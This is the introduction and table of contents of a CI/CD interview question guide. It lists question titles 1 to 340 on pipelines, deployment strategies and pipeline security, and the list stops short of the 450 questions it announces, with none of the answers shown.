# CI/CD Pipelines Interview Questions and Answers

_Last updated: October 29, 2026_

450 CI/CD interview questions with answers, split into three levels: 150 easy, 150 moderate and 150 advanced.

The answers are not tied to one tool, but most examples use GitHub Actions, GitLab CI and Jenkins (declarative pipelines), since those are the ones you will meet most often. Examples use current action versions like `actions/checkout@v6` and `actions/setup-node@v6`, OIDC for cloud access instead of stored keys, and GitOps tools like Argo CD. Older ways of doing things (scripted Jenkins pipelines, long-lived cloud keys, `latest` image tags) are mentioned where they still matter, since you will still see them in real projects.

## Table of Contents

- [Easy Questions (1-150)](#easy-questions-1-150)
- [Moderate Questions (151-300)](#moderate-questions-151-300)
- [Advanced Questions (301-450)](#advanced-questions-301-450)

### Easy Questions (1-150)

- [1: What is CI/CD?](#1-what-is-cicd)
- [2: What is continuous integration?](#2-what-is-continuous-integration)
- [3: What is continuous delivery?](#3-what-is-continuous-delivery)
- [4: What is continuous deployment?](#4-what-is-continuous-deployment)
- [5: What is the difference between continuous delivery and continuous deployment?](#5-what-is-the-difference-between-continuous-delivery-and-continuous-deployment)
- [6: What is a CI/CD pipeline?](#6-what-is-a-cicd-pipeline)
- [7: What is a stage in a pipeline?](#7-what-is-a-stage-in-a-pipeline)
- [8: What is a job?](#8-what-is-a-job)
- [9: What is a step?](#9-what-is-a-step)
- [10: What is a build?](#10-what-is-a-build)
- [11: What is a build artifact?](#11-what-is-a-build-artifact)
- [12: What is a runner or agent?](#12-what-is-a-runner-or-agent)
- [13: What is a pipeline trigger?](#13-what-is-a-pipeline-trigger)
- [14: What are some popular CI/CD tools?](#14-what-are-some-popular-cicd-tools)
- [15: Why do teams use CI/CD?](#15-why-do-teams-use-cicd)
- [16: What problem does continuous integration solve?](#16-what-problem-does-continuous-integration-solve)
- [17: What does "pipeline as code" mean?](#17-what-does-pipeline-as-code-mean)
- [18: Why is YAML so common in CI/CD tools?](#18-why-is-yaml-so-common-in-cicd-tools)
- [19: What does a basic GitHub Actions workflow look like?](#19-what-does-a-basic-github-actions-workflow-look-like)
- [20: What does a basic GitLab CI pipeline look like?](#20-what-does-a-basic-gitlab-ci-pipeline-look-like)
- [21: What does a basic Jenkinsfile look like?](#21-what-does-a-basic-jenkinsfile-look-like)
- [22: What is a workflow in GitHub Actions?](#22-what-is-a-workflow-in-github-actions)
- [23: What is an action in GitHub Actions?](#23-what-is-an-action-in-github-actions)
- [24: What is the .gitlab-ci.yml file?](#24-what-is-the-gitlab-ciyml-file)
- [25: What is Jenkins?](#25-what-is-jenkins)
- [26: What is the difference between declarative and scripted Jenkins pipelines?](#26-what-is-the-difference-between-declarative-and-scripted-jenkins-pipelines)
- [27: How do you use environment variables in a pipeline?](#27-how-do-you-use-environment-variables-in-a-pipeline)
- [28: What are secrets in CI/CD?](#28-what-are-secrets-in-cicd)
- [29: Why should you never put secrets in the repository?](#29-why-should-you-never-put-secrets-in-the-repository)
- [30: What is a broken build?](#30-what-is-a-broken-build)
- [31: What should you do when the build breaks?](#31-what-should-you-do-when-the-build-breaks)
- [32: What does "keep the build green" mean?](#32-what-does-keep-the-build-green-mean)
- [33: Why run unit tests in the pipeline?](#33-why-run-unit-tests-in-the-pipeline)
- [34: What are integration tests and where do they fit in a pipeline?](#34-what-are-integration-tests-and-where-do-they-fit-in-a-pipeline)
- [35: What are end-to-end tests?](#35-what-are-end-to-end-tests)
- [36: What is the test pyramid?](#36-what-is-the-test-pyramid)
- [37: Why run linters in CI?](#37-why-run-linters-in-ci)
- [38: How do you check code formatting in CI?](#38-how-do-you-check-code-formatting-in-ci)
- [39: What is static code analysis?](#39-what-is-static-code-analysis)
- [40: What is code coverage?](#40-what-is-code-coverage)
- [41: What is a pull request pipeline?](#41-what-is-a-pull-request-pipeline)
- [42: What are required status checks?](#42-what-are-required-status-checks)
- [43: What is branch protection?](#43-what-is-branch-protection)
- [44: What is an environment in CI/CD?](#44-what-is-an-environment-in-cicd)
- [45: What is a staging environment?](#45-what-is-a-staging-environment)
- [46: What is a deployment?](#46-what-is-a-deployment)
- [47: What is the difference between a deployment and a release?](#47-what-is-the-difference-between-a-deployment-and-a-release)
- [48: What is a rollback?](#48-what-is-a-rollback)
- [49: What is semantic versioning?](#49-what-is-semantic-versioning)
- [50: How are Git tags used in CI/CD?](#50-how-are-git-tags-used-in-cicd)
- [51: What is a build number?](#51-what-is-a-build-number)
- [52: What is the difference between npm install and npm ci?](#52-what-is-the-difference-between-npm-install-and-npm-ci)
- [53: Why should you commit lock files?](#53-why-should-you-commit-lock-files)
- [54: What is caching in a pipeline?](#54-what-is-caching-in-a-pipeline)
- [55: What is the difference between a cache and an artifact?](#55-what-is-the-difference-between-a-cache-and-an-artifact)
- [56: How is Docker used in CI/CD?](#56-how-is-docker-used-in-cicd)
- [57: What is a container registry?](#57-what-is-a-container-registry)
- [58: What is a Docker image tag?](#58-what-is-a-docker-image-tag)
- [59: Why should you avoid the latest tag in deployments?](#59-why-should-you-avoid-the-latest-tag-in-deployments)
- [60: What is infrastructure as code?](#60-what-is-infrastructure-as-code)
- [61: What is a deployment strategy?](#61-what-is-a-deployment-strategy)
- [62: What is a blue-green deployment?](#62-what-is-a-blue-green-deployment)
- [63: What is a canary deployment?](#63-what-is-a-canary-deployment)
- [64: What is a rolling deployment?](#64-what-is-a-rolling-deployment)
- [65: What is a recreate deployment?](#65-what-is-a-recreate-deployment)
- [66: What are feature flags?](#66-what-are-feature-flags)
- [67: What is trunk-based development?](#67-what-is-trunk-based-development)
- [68: What is Git Flow and how does it compare to trunk-based development?](#68-what-is-git-flow-and-how-does-it-compare-to-trunk-based-development)
- [69: How often should developers merge to the main branch?](#69-how-often-should-developers-merge-to-the-main-branch)
- [70: What is a nightly build?](#70-what-is-a-nightly-build)
- [71: How do you schedule a pipeline?](#71-how-do-you-schedule-a-pipeline)
- [72: How do you start a pipeline manually?](#72-how-do-you-start-a-pipeline-manually)
- [73: What is a manual approval step?](#73-what-is-a-manual-approval-step)
- [74: How does a CI tool know that a step failed?](#74-how-does-a-ci-tool-know-that-a-step-failed)
- [75: Why is set -e useful in shell scripts in CI?](#75-why-is-set--e-useful-in-shell-scripts-in-ci)
- [76: What are pipeline logs?](#76-what-are-pipeline-logs)
- [77: What is a status badge?](#77-what-is-a-status-badge)
- [78: How do pipelines send notifications?](#78-how-do-pipelines-send-notifications)
- [79: What is the difference between hosted and self-hosted runners?](#79-what-is-the-difference-between-hosted-and-self-hosted-runners)
- [80: How do you run jobs in parallel?](#80-how-do-you-run-jobs-in-parallel)
- [81: How do you make one job wait for another?](#81-how-do-you-make-one-job-wait-for-another)
- [82: What is a matrix build?](#82-what-is-a-matrix-build)
- [83: What is a monorepo and why does it matter for CI?](#83-what-is-a-monorepo-and-why-does-it-matter-for-ci)
- [84: What are common build tools you see in pipelines?](#84-what-are-common-build-tools-you-see-in-pipelines)
- [85: What is a smoke test?](#85-what-is-a-smoke-test)
- [86: What is a health check endpoint?](#86-what-is-a-health-check-endpoint)
- [87: What is a regression test?](#87-what-is-a-regression-test)
- [88: What is a flaky test?](#88-what-is-a-flaky-test)
- [89: What is DevOps?](#89-what-is-devops)
- [90: What is GitOps?](#90-what-is-gitops)
- [91: What does "build once, deploy many" mean?](#91-what-does-build-once-deploy-many-mean)
- [92: What is environment parity?](#92-what-is-environment-parity)
- [93: Why shouldn't you commit .env files?](#93-why-shouldnt-you-commit-env-files)
- [94: What is a webhook in CI/CD?](#94-what-is-a-webhook-in-cicd)
- [95: What is the difference between polling and webhooks for triggering builds?](#95-what-is-the-difference-between-polling-and-webhooks-for-triggering-builds)
- [96: What is a job timeout?](#96-what-is-a-job-timeout)
- [97: How do you let a job fail without failing the whole pipeline?](#97-how-do-you-let-a-job-fail-without-failing-the-whole-pipeline)
- [98: How do you run a step only under certain conditions?](#98-how-do-you-run-a-step-only-under-certain-conditions)
- [99: What are path filters?](#99-what-are-path-filters)
- [100: How do you skip CI for a commit?](#100-how-do-you-skip-ci-for-a-commit)
- [101: Why do most jobs start with a checkout step?](#101-why-do-most-jobs-start-with-a-checkout-step)
- [102: What is the workspace of a job?](#102-what-is-the-workspace-of-a-job)
- [103: What are predefined CI variables?](#103-what-are-predefined-ci-variables)
- [104: What is the difference between a variable and a secret in CI?](#104-what-is-the-difference-between-a-variable-and-a-secret-in-ci)
- [105: What does it mean when a secret is masked?](#105-what-does-it-mean-when-a-secret-is-masked)
- [106: How would you deploy a static website with a pipeline?](#106-how-would-you-deploy-a-static-website-with-a-pipeline)
- [107: How would you deploy a simple Node.js API with a pipeline?](#107-how-would-you-deploy-a-simple-nodejs-api-with-a-pipeline)
- [108: What is a preview environment?](#108-what-is-a-preview-environment)
- [109: What is a release branch?](#109-what-is-a-release-branch)
- [110: What is a hotfix?](#110-what-is-a-hotfix)
- [111: What is a changelog?](#111-what-is-a-changelog)
- [112: What is a package registry?](#112-what-is-a-package-registry)
- [113: What is a container?](#113-what-is-a-container)
- [114: How do you build a Docker image in a pipeline?](#114-how-do-you-build-a-docker-image-in-a-pipeline)
- [115: How does Kubernetes fit into CD?](#115-how-does-kubernetes-fit-into-cd)
- [116: How do you deploy a serverless function from a pipeline?](#116-how-do-you-deploy-a-serverless-function-from-a-pipeline)
- [117: What are database migrations and why run them in a pipeline?](#117-what-are-database-migrations-and-why-run-them-in-a-pipeline)
- [118: What is a zero-downtime deployment?](#118-what-is-a-zero-downtime-deployment)
- [119: What is MTTR?](#119-what-is-mttr)
- [120: What are the DORA metrics?](#120-what-are-the-dora-metrics)
- [121: What is deployment frequency?](#121-what-is-deployment-frequency)
- [122: What is lead time for changes?](#122-what-is-lead-time-for-changes)
- [123: What is change failure rate?](#123-what-is-change-failure-rate)
- [124: What does "shift left" mean?](#124-what-does-shift-left-mean)
- [125: What is a quality gate?](#125-what-is-a-quality-gate)
- [126: What is SonarQube?](#126-what-is-sonarqube)
- [127: What is dependency scanning?](#127-what-is-dependency-scanning)
- [128: What are Dependabot and Renovate?](#128-what-are-dependabot-and-renovate)
- [129: What is SAST?](#129-what-is-sast)
- [130: What is DAST?](#130-what-is-dast)
- [131: Can you run a pipeline locally?](#131-can-you-run-a-pipeline-locally)
- [132: What statuses can a pipeline run have?](#132-what-statuses-can-a-pipeline-run-have)
- [133: How do you re-run a failed job?](#133-how-do-you-re-run-a-failed-job)
- [134: What is cron syntax?](#134-what-is-cron-syntax)
- [135: What is the GitHub Marketplace for actions?](#135-what-is-the-github-marketplace-for-actions)
- [136: What is Azure Pipelines?](#136-what-is-azure-pipelines)
- [137: What is CircleCI?](#137-what-is-circleci)
- [138: What is Argo CD?](#138-what-is-argo-cd)
- [139: What is a pre-commit hook and how is it different from CI?](#139-what-is-a-pre-commit-hook-and-how-is-it-different-from-ci)
- [140: What does "fail fast" mean in a pipeline?](#140-what-does-fail-fast-mean-in-a-pipeline)
- [141: What is artifact retention?](#141-what-is-artifact-retention)
- [142: What is the difference between a workflow, a pipeline and a run?](#142-what-is-the-difference-between-a-workflow-a-pipeline-and-a-run)
- [143: What is a deploy key?](#143-what-is-a-deploy-key)
- [144: What is a personal access token and why is it risky in CI?](#144-what-is-a-personal-access-token-and-why-is-it-risky-in-ci)
- [145: Why should pipelines be fast?](#145-why-should-pipelines-be-fast)
- [146: What does a good CI pipeline look like?](#146-what-does-a-good-ci-pipeline-look-like)
- [147: What are common mistakes beginners make with CI/CD?](#147-what-are-common-mistakes-beginners-make-with-cicd)
- [148: What is the difference between CI/CD and a build server?](#148-what-is-the-difference-between-cicd-and-a-build-server)
- [149: Who is responsible for the pipeline?](#149-who-is-responsible-for-the-pipeline)
- [150: How do you start adding CI to a project that has none?](#150-how-do-you-start-adding-ci-to-a-project-that-has-none)

### Moderate Questions (151-300)

- [151: How would you design a CI pipeline for a typical Node.js web app?](#151-how-would-you-design-a-ci-pipeline-for-a-typical-nodejs-web-app)
- [152: Can you write a full GitHub Actions CI workflow for a Node.js project?](#152-can-you-write-a-full-github-actions-ci-workflow-for-a-nodejs-project)
- [153: How does dependency caching work in GitHub Actions?](#153-how-does-dependency-caching-work-in-github-actions)
- [154: What are cache keys and restore keys?](#154-what-are-cache-keys-and-restore-keys)
- [155: How does caching work in GitLab CI?](#155-how-does-caching-work-in-gitlab-ci)
- [156: How do artifacts work in GitLab CI?](#156-how-do-artifacts-work-in-gitlab-ci)
- [157: How do you pass files between jobs in GitHub Actions?](#157-how-do-you-pass-files-between-jobs-in-github-actions)
- [158: What is a DAG pipeline in GitLab?](#158-what-is-a-dag-pipeline-in-gitlab)
- [159: How do you share values between jobs in GitHub Actions?](#159-how-do-you-share-values-between-jobs-in-github-actions)
- [160: What are GITHUB_ENV, GITHUB_OUTPUT and GITHUB_STEP_SUMMARY?](#160-what-are-github_env-github_output-and-github_step_summary)
- [161: What are contexts and expressions in GitHub Actions?](#161-what-are-contexts-and-expressions-in-github-actions)
- [162: How do success(), failure(), always() and cancelled() work in GitHub Actions?](#162-how-do-success-failure-always-and-cancelled-work-in-github-actions)
- [163: How do rules work in GitLab CI?](#163-how-do-rules-work-in-gitlab-ci)
- [164: What is the difference between the push and pull_request triggers in GitHub Actions?](#164-what-is-the-difference-between-the-push-and-pull_request-triggers-in-github-actions)
- [165: What is pull_request_target and why is it risky?](#165-what-is-pull_request_target-and-why-is-it-risky)
- [166: How do you cancel old pipeline runs when a new commit is pushed?](#166-how-do-you-cancel-old-pipeline-runs-when-a-new-commit-is-pushed)
- [167: How do you stop two deployments from running at the same time?](#167-how-do-you-stop-two-deployments-from-running-at-the-same-time)
- [168: How do environments work in GitHub Actions?](#168-how-do-environments-work-in-github-actions)
- [169: How do environments work in GitLab?](#169-how-do-environments-work-in-gitlab)
- [170: How do you use different secrets for staging and production?](#170-how-do-you-use-different-secrets-for-staging-and-production)
- [171: What are reusable workflows in GitHub Actions?](#171-what-are-reusable-workflows-in-github-actions)
- [172: What is a composite action and how is it different from a reusable workflow?](#172-what-is-a-composite-action-and-how-is-it-different-from-a-reusable-workflow)
- [173: How do you reuse configuration in GitLab CI?](#173-how-do-you-reuse-configuration-in-gitlab-ci)
- [174: What are YAML anchors and when are they useful?](#174-what-are-yaml-anchors-and-when-are-they-useful)
- [175: What are Jenkins shared libraries?](#175-what-are-jenkins-shared-libraries)
- [176: How do agents and labels work in Jenkins?](#176-how-do-agents-and-labels-work-in-jenkins)
- [177: What is the post section in a Jenkins pipeline?](#177-what-is-the-post-section-in-a-jenkins-pipeline)
- [178: How do you use credentials in a Jenkins pipeline?](#178-how-do-you-use-credentials-in-a-jenkins-pipeline)
- [179: How do you run stages in parallel in Jenkins?](#179-how-do-you-run-stages-in-parallel-in-jenkins)
- [180: What is a Jenkins multibranch pipeline?](#180-what-is-a-jenkins-multibranch-pipeline)
- [181: What options does a matrix strategy have in GitHub Actions?](#181-what-options-does-a-matrix-strategy-have-in-github-actions)
- [182: How does parallel:matrix work in GitLab?](#182-how-does-parallelmatrix-work-in-gitlab)
- [183: How do you split a slow test suite across several jobs?](#183-how-do-you-split-a-slow-test-suite-across-several-jobs)
- [184: How do you build and push a Docker image with GitHub Actions properly?](#184-how-do-you-build-and-push-a-docker-image-with-github-actions-properly)
- [185: How do you make Docker builds fast in CI?](#185-how-do-you-make-docker-builds-fast-in-ci)
- [186: Why use multi-stage Dockerfiles?](#186-why-use-multi-stage-dockerfiles)
- [187: How should you tag Docker images in a pipeline?](#187-how-should-you-tag-docker-images-in-a-pipeline)
- [188: What is the difference between Docker-in-Docker and mounting the Docker socket?](#188-what-is-the-difference-between-docker-in-docker-and-mounting-the-docker-socket)
- [189: How do you run a database for tests in GitHub Actions?](#189-how-do-you-run-a-database-for-tests-in-github-actions)
- [190: How do services work in GitLab CI?](#190-how-do-services-work-in-gitlab-ci)
- [191: How do you run Playwright E2E tests in CI?](#191-how-do-you-run-playwright-e2e-tests-in-ci)
- [192: How do you show test results in pull requests?](#192-how-do-you-show-test-results-in-pull-requests)
- [193: How do you fail the build when coverage drops?](#193-how-do-you-fail-the-build-when-coverage-drops)
- [194: How do you deal with flaky tests in a pipeline?](#194-how-do-you-deal-with-flaky-tests-in-a-pipeline)
- [195: Should you add automatic retries to CI jobs?](#195-should-you-add-automatic-retries-to-ci-jobs)
- [196: How do you run database migrations safely in a CD pipeline?](#196-how-do-you-run-database-migrations-safely-in-a-cd-pipeline)
- [197: How do you deploy to Kubernetes from a pipeline?](#197-how-do-you-deploy-to-kubernetes-from-a-pipeline)
- [198: What is Helm and how is it used in CD?](#198-what-is-helm-and-how-is-it-used-in-cd)
- [199: What is Kustomize?](#199-what-is-kustomize)
- [200: How would you deploy a container to AWS ECS from a pipeline?](#200-how-would-you-deploy-a-container-to-aws-ecs-from-a-pipeline)
- [201: How do you deploy a frontend to S3 and CloudFront from a pipeline?](#201-how-do-you-deploy-a-frontend-to-s3-and-cloudfront-from-a-pipeline)
- [202: How do preview deployments on Vercel or Netlify work?](#202-how-do-preview-deployments-on-vercel-or-netlify-work)
- [203: What is OIDC in CI/CD and why use it instead of stored cloud keys?](#203-what-is-oidc-in-cicd-and-why-use-it-instead-of-stored-cloud-keys)
- [204: What is GITHUB_TOKEN?](#204-what-is-github_token)
- [205: Why should you set the permissions key in workflows?](#205-why-should-you-set-the-permissions-key-in-workflows)
- [206: Why pin actions to a commit SHA?](#206-why-pin-actions-to-a-commit-sha)
- [207: How does automated versioning with semantic-release work?](#207-how-does-automated-versioning-with-semantic-release-work)
- [208: What are Conventional Commits?](#208-what-are-conventional-commits)
- [209: How does Changesets work for versioning in a monorepo?](#209-how-does-changesets-work-for-versioning-in-a-monorepo)
- [210: How do you publish an npm package from CI?](#210-how-do-you-publish-an-npm-package-from-ci)
- [211: How do you create a GitHub release from a pipeline?](#211-how-do-you-create-a-github-release-from-a-pipeline)
- [212: What does promoting a build between environments mean?](#212-what-does-promoting-a-build-between-environments-mean)
- [213: How do you handle configuration for different environments?](#213-how-do-you-handle-configuration-for-different-environments)
- [214: How do you manage feature flags in a CI/CD workflow?](#214-how-do-you-manage-feature-flags-in-a-cicd-workflow)
- [215: How would you implement blue-green deployments in practice?](#215-how-would-you-implement-blue-green-deployments-in-practice)
- [216: How would you implement a canary release in practice?](#216-how-would-you-implement-a-canary-release-in-practice)
- [217: How do rolling updates work in Kubernetes?](#217-how-do-rolling-updates-work-in-kubernetes)
- [218: Why do readiness and liveness probes matter for deployments?](#218-why-do-readiness-and-liveness-probes-matter-for-deployments)
- [219: How do you set up automatic rollback?](#219-how-do-you-set-up-automatic-rollback)
- [220: What is the difference between rolling back and rolling forward?](#220-what-is-the-difference-between-rolling-back-and-rolling-forward)
- [221: How do database changes affect rollbacks?](#221-how-do-database-changes-affect-rollbacks)
- [222: How do you build only what changed in a monorepo?](#222-how-do-you-build-only-what-changed-in-a-monorepo)
- [223: How does remote caching help CI in a monorepo?](#223-how-does-remote-caching-help-ci-in-a-monorepo)
- [224: What are the main ways to speed up a slow pipeline?](#224-what-are-the-main-ways-to-speed-up-a-slow-pipeline)
- [225: How do you find out where a pipeline spends its time?](#225-how-do-you-find-out-where-a-pipeline-spends-its-time)
- [226: When would you use self-hosted runners?](#226-when-would-you-use-self-hosted-runners)
- [227: What are ephemeral runners and why are they safer?](#227-what-are-ephemeral-runners-and-why-are-they-safer)
- [228: How do you choose which runner a job uses?](#228-how-do-you-choose-which-runner-a-job-uses)
- [229: What are GitLab runner executors?](#229-what-are-gitlab-runner-executors)
- [230: What is the difference between the Jenkins controller and agents?](#230-what-is-the-difference-between-the-jenkins-controller-and-agents)
- [231: How are environment variable scopes handled in GitHub Actions?](#231-how-are-environment-variable-scopes-handled-in-github-actions)
- [232: What are some useful predefined variables in GitLab CI?](#232-what-are-some-useful-predefined-variables-in-gitlab-ci)
- [233: What are protected branches and protected variables in GitLab?](#233-what-are-protected-branches-and-protected-variables-in-gitlab)
- [234: How do you debug a failing pipeline?](#234-how-do-you-debug-a-failing-pipeline)
- [235: How do you turn on debug logging in GitHub Actions?](#235-how-do-you-turn-on-debug-logging-in-github-actions)
- [236: Why does a build pass locally but fail in CI?](#236-why-does-a-build-pass-locally-but-fail-in-ci)
- [237: How do you keep the Node.js version the same locally and in CI?](#237-how-do-you-keep-the-nodejs-version-the-same-locally-and-in-ci)
- [238: How do you check commit messages in CI?](#238-how-do-you-check-commit-messages-in-ci)
- [239: What is a merge queue?](#239-what-is-a-merge-queue)
- [240: What are merge trains in GitLab?](#240-what-are-merge-trains-in-gitlab)
- [241: How do pipelines work for pull requests from forks?](#241-how-do-pipelines-work-for-pull-requests-from-forks)
- [242: How do you use workflow_run in GitHub Actions?](#242-how-do-you-use-workflow_run-in-github-actions)
- [243: How do you trigger a pipeline in another repository?](#243-how-do-you-trigger-a-pipeline-in-another-repository)
- [244: What are parent-child pipelines in GitLab?](#244-what-are-parent-child-pipelines-in-gitlab)
- [245: How do you add an approval step in Jenkins?](#245-how-do-you-add-an-approval-step-in-jenkins)
- [246: How do you run a Jenkins stage inside a Docker container?](#246-how-do-you-run-a-jenkins-stage-inside-a-docker-container)
- [247: How do you choose between GitHub Actions, GitLab CI and Jenkins?](#247-how-do-you-choose-between-github-actions-gitlab-ci-and-jenkins)
- [248: How would you migrate a project from Jenkins to GitHub Actions?](#248-how-would-you-migrate-a-project-from-jenkins-to-github-actions)
- [249: How does CI/CD work for mobile apps?](#249-how-does-cicd-work-for-mobile-apps)
- [250: Should slow E2E tests run on every pull request?](#250-should-slow-e2e-tests-run-on-every-pull-request)
- [251: How do you clean up preview environments?](#251-how-do-you-clean-up-preview-environments)
- [252: How do you handle test data in CI?](#252-how-do-you-handle-test-data-in-ci)
- [253: How do you protect pipeline files from unwanted changes?](#253-how-do-you-protect-pipeline-files-from-unwanted-changes)
- [254: How would you set up Renovate for a project?](#254-how-would-you-set-up-renovate-for-a-project)
- [255: What is license compliance scanning?](#255-what-is-license-compliance-scanning)
- [256: How do you scan container images for vulnerabilities in CI?](#256-how-do-you-scan-container-images-for-vulnerabilities-in-ci)
- [257: How do you prevent secrets from being committed?](#257-how-do-you-prevent-secrets-from-being-committed)
- [258: How do you set up CodeQL in GitHub Actions?](#258-how-do-you-set-up-codeql-in-github-actions)
- [259: What is an SBOM?](#259-what-is-an-sbom)
- [260: How do you run Terraform in a pipeline?](#260-how-do-you-run-terraform-in-a-pipeline)
- [261: How should Terraform state be handled in CI?](#261-how-should-terraform-state-be-handled-in-ci)
- [262: What is infrastructure drift and how do you detect it?](#262-what-is-infrastructure-drift-and-how-do-you-detect-it)
- [263: How is Ansible used in CI/CD?](#263-how-is-ansible-used-in-cicd)
- [264: What does a full GitOps flow with Argo CD look like?](#264-what-does-a-full-gitops-flow-with-argo-cd-look-like)
- [265: What is the difference between push-based and pull-based deployment?](#265-what-is-the-difference-between-push-based-and-pull-based-deployment)
- [266: How do you update the image tag in a GitOps repo from CI?](#266-how-do-you-update-the-image-tag-in-a-gitops-repo-from-ci)
- [267: What should you check after a deployment?](#267-what-should-you-check-after-a-deployment)
- [268: What is synthetic monitoring?](#268-what-is-synthetic-monitoring)
- [269: How do you connect deployments to monitoring?](#269-how-do-you-connect-deployments-to-monitoring)
- [270: How does change management work with CI/CD?](#270-how-does-change-management-work-with-cicd)
- [271: How do you keep an audit trail of deployments?](#271-how-do-you-keep-an-audit-trail-of-deployments)
- [272: How do you use Docker Compose for integration tests in CI?](#272-how-do-you-use-docker-compose-for-integration-tests-in-ci)
- [273: What is Testcontainers?](#273-what-is-testcontainers)
- [274: What is contract testing?](#274-what-is-contract-testing)
- [275: How do you run performance tests in a pipeline?](#275-how-do-you-run-performance-tests-in-a-pipeline)
- [276: What are visual regression tests?](#276-what-are-visual-regression-tests)
- [277: How do you test accessibility in CI?](#277-how-do-you-test-accessibility-in-ci)
- [278: What is Lighthouse CI?](#278-what-is-lighthouse-ci)
- [279: How do you stop JavaScript bundle size from growing?](#279-how-do-you-stop-javascript-bundle-size-from-growing)
- [280: What is an artifact repository like Nexus or Artifactory?](#280-what-is-an-artifact-repository-like-nexus-or-artifactory)
- [281: How do you clean up old images and artifacts?](#281-how-do-you-clean-up-old-images-and-artifacts)
- [282: How do you keep CI costs under control?](#282-how-do-you-keep-ci-costs-under-control)
- [283: What is the problem with path filters and required status checks?](#283-what-is-the-problem-with-path-filters-and-required-status-checks)
- [284: How do you run a whole GitHub Actions job inside a container?](#284-how-do-you-run-a-whole-github-actions-job-inside-a-container)
- [285: How do you lint pipeline files?](#285-how-do-you-lint-pipeline-files)
- [286: How do you test changes to a pipeline safely?](#286-how-do-you-test-changes-to-a-pipeline-safely)
- [287: How do you use a secret manager like Vault in a pipeline?](#287-how-do-you-use-a-secret-manager-like-vault-in-a-pipeline)
- [288: What should you watch out for with environment variables in frontend builds?](#288-what-should-you-watch-out-for-with-environment-variables-in-frontend-builds)
- [289: What are common caching problems in CI?](#289-what-are-common-caching-problems-in-ci)
- [290: Why does fetch-depth matter for some tools?](#290-why-does-fetch-depth-matter-for-some-tools)
- [291: How do you install private npm packages in CI?](#291-how-do-you-install-private-npm-packages-in-ci)
- [292: How do you check out a private submodule or a second repo in CI?](#292-how-do-you-check-out-a-private-submodule-or-a-second-repo-in-ci)
- [293: How do you know which version is running in an environment?](#293-how-do-you-know-which-version-is-running-in-an-environment)
- [294: How would you set up a tag-based release workflow?](#294-how-would-you-set-up-a-tag-based-release-workflow)
- [295: How do you deploy several services that depend on each other?](#295-how-do-you-deploy-several-services-that-depend-on-each-other)
- [296: What can go wrong with scheduled workflows?](#296-what-can-go-wrong-with-scheduled-workflows)
- [297: What should you know about Windows and macOS runners?](#297-what-should-you-know-about-windows-and-macos-runners)
- [298: How do you make errors easy to find in GitHub Actions logs?](#298-how-do-you-make-errors-easy-to-find-in-github-actions-logs)
- [299: How would you add a manual rollback workflow?](#299-how-would-you-add-a-manual-rollback-workflow)
- [300: How do you document a pipeline for the team?](#300-how-do-you-document-a-pipeline-for-the-team)

### Advanced Questions (301-450)

- [301: How would you design CI/CD for a company with 100 microservices?](#301-how-would-you-design-cicd-for-a-company-with-100-microservices)
- [302: What are the CI trade-offs between a monorepo and many repos?](#302-what-are-the-ci-trade-offs-between-a-monorepo-and-many-repos)
- [303: What makes build systems like Bazel different from npm scripts?](#303-what-makes-build-systems-like-bazel-different-from-npm-scripts)
- [304: What is a hermetic build?](#304-what-is-a-hermetic-build)
- [305: What is a reproducible build and why does it matter?](#305-what-is-a-reproducible-build-and-why-does-it-matter)
- [306: What is software supply chain security in CI/CD?](#306-what-is-software-supply-chain-security-in-cicd)
- [307: What is SLSA?](#307-what-is-slsa)
- [308: What are build provenance attestations?](#308-what-are-build-provenance-attestations)
- [309: How does keyless signing with Sigstore work?](#309-how-does-keyless-signing-with-sigstore-work)
- [310: How do you make sure only trusted images run in Kubernetes?](#310-how-do-you-make-sure-only-trusted-images-run-in-kubernetes)
- [311: What is a dependency confusion attack?](#311-what-is-a-dependency-confusion-attack)
- [312: How do you protect CI from malicious npm packages?](#312-how-do-you-protect-ci-from-malicious-npm-packages)
- [313: What was the tj-actions/changed-files incident and what are the lessons?](#313-what-was-the-tj-actionschanged-files-incident-and-what-are-the-lessons)
- [314: What is poisoned pipeline execution?](#314-what-is-poisoned-pipeline-execution)
- [315: What is a "pwn request" in GitHub Actions?](#315-what-is-a-pwn-request-in-github-actions)
- [316: What is script injection in GitHub Actions?](#316-what-is-script-injection-in-github-actions)
- [317: Why are self-hosted runners on public repositories dangerous?](#317-why-are-self-hosted-runners-on-public-repositories-dangerous)
- [318: What is cache poisoning in CI?](#318-what-is-cache-poisoning-in-ci)
- [319: How can secrets leak from a pipeline even with masking?](#319-how-can-secrets-leak-from-a-pipeline-even-with-masking)
- [320: How do you restrict an OIDC trust policy correctly?](#320-how-do-you-restrict-an-oidc-trust-policy-correctly)
- [321: How do short-lived credentials improve pipeline security?](#321-how-do-short-lived-credentials-improve-pipeline-security)
- [322: How do you rotate a secret used by many pipelines without downtime?](#322-how-do-you-rotate-a-secret-used-by-many-pipelines-without-downtime)
- [323: How do you enforce separation of duties in deployments?](#323-how-do-you-enforce-separation-of-duties-in-deployments)
- [324: How do you protect the pipeline configuration itself?](#324-how-do-you-protect-the-pipeline-configuration-itself)
- [325: How do deployment branch rules on environments help?](#325-how-do-deployment-branch-rules-on-environments-help)
- [326: How would you harden a Jenkins installation?](#326-how-would-you-harden-a-jenkins-installation)
- [327: How do you isolate jobs from each other on shared infrastructure?](#327-how-do-you-isolate-jobs-from-each-other-on-shared-infrastructure)
- [328: How do you limit network access from CI runners?](#328-how-do-you-limit-network-access-from-ci-runners)
- [329: How do you scale self-hosted runners?](#329-how-do-you-scale-self-hosted-runners)
- [330: What are the trade-offs of using spot instances for CI runners?](#330-what-are-the-trade-offs-of-using-spot-instances-for-ci-runners)
- [331: Why is queue time an important CI metric?](#331-why-is-queue-time-an-important-ci-metric)
- [332: How do you observe CI pipelines at scale?](#332-how-do-you-observe-ci-pipelines-at-scale)
- [333: How do you detect and manage flaky tests across a large codebase?](#333-how-do-you-detect-and-manage-flaky-tests-across-a-large-codebase)
- [334: What is test impact analysis?](#334-what-is-test-impact-analysis)
- [335: What is predictive test selection?](#335-what-is-predictive-test-selection)
- [336: How do you design good cache keys for build caching?](#336-how-do-you-design-good-cache-keys-for-build-caching)
- [337: What problems can happen when a build cache gives wrong results?](#337-what-problems-can-happen-when-a-build-cache-gives-wrong-results)
- [338: How do you keep Docker layer caching on ephemeral runners?](#338-how-do-you-keep-docker-layer-caching-on-ephemeral-runners)
- [339: How do you speed up checkout of a very large repository in CI?](#339-how-do-you-speed-up-checkout-of-a-very-large-repository-in-ci)
- [340: Why should CI test the merge result instead of the branch alone?](#340-why-should-ci-test-the-merge-result-instead-of-the-branch-alone)
